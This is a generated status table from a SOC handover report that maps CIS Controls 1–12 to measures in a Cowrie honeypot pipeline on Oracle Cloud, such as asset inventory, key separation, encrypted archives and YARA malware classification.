| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-09T12:59:01Z_
